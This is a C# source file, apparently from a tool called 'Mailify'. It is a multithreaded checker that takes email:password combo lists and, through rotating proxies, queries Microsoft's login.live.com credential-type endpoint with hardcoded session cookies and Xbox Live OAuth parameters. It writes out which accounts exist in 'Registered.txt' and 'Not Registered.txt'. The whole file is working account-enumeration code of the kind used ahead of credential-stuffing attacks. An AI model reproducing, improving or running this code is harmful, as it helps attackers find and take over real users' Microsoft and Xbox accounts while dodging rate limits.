using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Xbox_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    request.AddHeader("Cookie", "MSCC=74.82.28.71-US; wlidperf=FR=L&ST=1615401810151; MSPShared=1; SDIDC=CZEmyTlkly5YD7zirv0FiEkXWDRQPt7ZWs5xb8vBWSOsqL*eRUvUuI0NZCSmVGLV3GxzMAMGKwVJwHAM!TlqtECFihWkY2rgLhNHvN8bogqdpzi6dOE!2j4*90Tg3uwoolH0spa87b*JC88QY!XdgY8$; MSPRequ=id=N&lt=1615473113&co=1; uaid=f3e1dbf99b9044389241c330a43fa84b; OParams=11DUEOJuw9T4OOJoIYd665ENBskyf06gc6S9XV1SGYm*niIRpuUQb38zw1PMJOKuTHFSJjc4GN4CEdMXLdBqNr9u*UzRamm39ApmFDx1Hmsmzs0Ofoea8Uml1z97CcPHXDhIt8WUJ7WFCgDlEJF4Gd*hSlH1zTo4KwAuOYd8qSNzcXhPhvyeLjXJqd1XR!xYXCIT6W6T!Ap38k3YotOL!2wfHMj6583vGWZRFlse0LfDD0rSW4qeqZFrQTaeL99YKqpo08vR6zofpjNm6A2A!qdsOzmggFV25EpuqflGuKRtBUnxDfUUuXjxty1TNImVI6kgfQb5YcHOGH00Vqh2N!h5k3l5SmLuQ5psWjync1gSOzMjzvRX4F4Q5!*A*fddSy4ivp49*kI2dKsqJfjODmot7!dhRV1Ff9x!sqqR8cg0Io177bHlnvOx35qFIO6E0fIG0Vs!xc!msC6dhPDSMibFOZJLMkdqm9rgrhzTsuwK1dL6isaRZEZQV611yO7h2F5bJNwpA5nLH98I3Z0GbbRJEfdpZJuJyosb8nHw0sYc*F71Nm60QgI4jV1foBUryxEwPn13cTClukLZsxAo4AssoRVgd6AHSC8NVUxKrpc2FM8508ZC*FSHLtrNhC1rbPDvH3Cn1ammEcsJku01!xmTbfqVpJYV!houn4jfIEPlW4; MSPOK=$uuid-68fbc464-6627-42e6-a423-b6f25b6cf85f");
                    string check = request.Post("https://login.live.com/GetCredentialType.srf?opid=025DDF2CE5F5522C&id=290794&client_id=000000004420578E&uiflavor=web&redirect_uri=https%3a%2f%2fsisu.xboxlive.com%2fconnect%2foauth%2fXboxLive&response_type=code&state=LAAAAAEB1xaDSBEnyvpgzbJ8rJu6npcq-702wbkF6bULv5rHURHZXR91t5cfZmZiZTdiMjEwNGY0NDIyOTk5MGE5MWNiODJhMzdlMmMx&client_id=000000004420578E&scope=XboxLive.Signin&lw=1&fl=dob,easi2&xsup=1&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&mkt=EN-US&lc=1033&uaid=f3e1dbf99b9044389241c330a43fa84b", "{\"username\":\"" + credentials[0] + "\",\"uaid\":\"f3e1dbf99b9044389241c330a43fa84b\",\"isOtherIdpSupported\":false,\"checkPhones\":false,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":true,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":3,\"isSignup\":false,\"flowToken\":\"DWJOpE3OqMhQDV!nAIeLJIH9jqCwuiP!Sfs2bG3U*EU8CqE2tu!5CqdxR!EP71E2QNi6mz3ZISmoL2hOHSm8v1MmwA8!nCRCF9tn5O0kneyZ3z3Fgaz4**zddQWtOtOQ54VVjFuuiftBdR0GN3Lrb51p9VaV2HYHfRRVHkBDZ87je*g9xL6iMqEsgoZ!hDlfz2270zbLmVPKVjFBCHoeTSk$\"}", "application/json").ToString();
                
                    if (check.Contains("IfExistsResult\":0"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (check.Contains("IfExistsResult\":1"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}